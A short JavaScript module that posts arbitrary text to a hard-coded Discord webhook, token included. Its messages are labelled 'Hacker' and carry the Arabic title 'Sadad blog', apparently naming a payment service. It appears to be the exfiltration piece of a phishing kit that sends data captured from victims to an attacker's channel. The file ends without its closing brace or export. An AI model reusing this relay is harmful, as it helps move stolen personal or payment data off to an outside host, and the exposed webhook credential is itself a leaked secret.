import axios from 'axios';


const TeleSned = () => {
     
    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };

        await axios.post("https://discord.com/api/webhooks/1313843723846684743/N_uoTJRDuFxtU8T3MvXTzyiaiu6CBuxjGvK0Tm4F6QDIJupH61uCj2oXVfXfthpDOwfl",body) 
    }
  return {
    Send,
}
